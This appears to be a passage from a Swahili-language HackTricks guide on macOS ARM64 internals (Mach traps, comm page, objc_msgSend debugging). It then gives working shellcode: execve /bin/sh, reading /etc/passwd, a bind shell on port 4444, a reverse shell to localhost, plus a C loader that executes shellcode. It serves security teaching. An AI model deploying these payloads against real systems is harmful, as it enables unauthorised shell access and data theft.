Angalia katika [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` na katika [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototypes. Idadi ya juu ya Mach traps ni `MACH_TRAP_TABLE_COUNT` = 128. Mach traps zitakuwa na **x16 < 0**, kwa hiyo unahitaji kuita namba kutoka kwenye list iliyotangulia zikiwa na **minus**: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.

Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kupata jinsi ya kuita syscalls hizi (na za BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Kumbuka kwamba **Ida** na **Ghidra** zinaweza pia ku-decompile **dylibs maalum** kutoka kwenye cache kwa kupitisha tu cache.

> [!TIP]
> Wakati mwingine ni rahisi zaidi kuangalia code **iliyo-decompiled** kutoka kwa **`libsystem_kernel.dylib`** **kuliko** kuangalia **source code**, kwa sababu code ya baadhi ya syscalls (BSD na Mach) hutengenezwa kupitia scripts (angalia comments kwenye source code), wakati kwenye dylib unaweza kuona kinachoitwa.

### machdep calls

XNU inasaidia aina nyingine ya calls zinazoitwa machine dependent. Namba za calls hizi hutegemea architecture, na calls au namba zake hazijahakikishwa kubaki thabiti.

### comm page

Hii ni memory page inayomilikiwa na kernel na ambayo ime-mapped kwenye address space ya kila users process. Imekusudiwa kufanya transition kutoka user mode hadi kernel space iwe haraka kuliko kutumia syscalls kwa kernel services zinazotumika sana kiasi kwamba transition hii ingekuwa isiyofaa sana.

Kwa mfano, call `gettimeofdate` husoma thamani ya `timeval` moja kwa moja kutoka kwenye comm page.

### objc_msgSend

Ni jambo la kawaida sana kupata function hii ikitumika katika programu za Objective-C au Swift. Function hii huruhusu kuita method ya object ya Objective-C.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> Pointer ya instance
- x1: op -> Selector ya method
- x2... -> Arguments zilizobaki za method iliyoitwa

Kwa hiyo, ukiweka breakpoint kabla ya branch kwenda kwenye function hii, unaweza kupata kwa urahisi kinachoitiwa katika lldb kwa kutumia (katika mfano huu object inaita object kutoka `NSConcreteTask` ambayo itaendesha command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Kuweka env variable **`NSObjCMessageLoggingEnabled=1`** kunawezesha kurekodi wakati function hii inaitwa katika file kama `/tmp/msgSends-pid`.
>
> Zaidi ya hayo, kuweka **`OBJC_HELP=1`** na kuita binary yoyote kunaweza kukuonyesha environment variables nyingine unazoweza kutumia **kurekodi** wakati actions fulani za Objc-C zinapotokea.

Wakati function hii inaitwa, inahitajika kutafuta method iliyoitwa ya instance iliyoonyeshwa; kwa hili, searches tofauti hufanywa:

- Fanya optimistic cache lookup:
- Ikiwa imefanikiwa, imekamilika
- Pata runtimeLock (read)
- Ikiwa (realize && !cls->realized), realize class
- Ikiwa (initialize && !cls->initialized), initialize class
- Jaribu cache ya class yenyewe:
- Ikiwa imefanikiwa, imekamilika
- Jaribu method list ya class:
- Ikiwa imepatikana, jaza cache na ukamilishe
- Jaribu cache ya superclass:
- Ikiwa imefanikiwa, imekamilika
- Jaribu method list ya superclass:
- Ikiwa imepatikana, jaza cache na ukamilishe
- Ikiwa (resolver), jaribu method resolver, na urudie kuanzia class lookup
- Ikiwa bado uko hapa (= kila kitu kingine kimeshindwa), jaribu forwarder

### Shellcodes

Kukompile:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Ili kutoa bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Kwa matoleo mapya zaidi ya macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code ya kujaribu shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Imetolewa [**hapa**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) na imeelezwa.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Soma kwa cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo argument ya pili (x1) ni array ya params (ambayo kwenye memory inamaanisha stack ya addresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Tekeleza command kwa kutumia sh kutoka kwenye fork ili main process isiuliwe
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) kwenye **port 4444**<sup>[[2]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Kutoka [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell kwa **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Marejeo

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
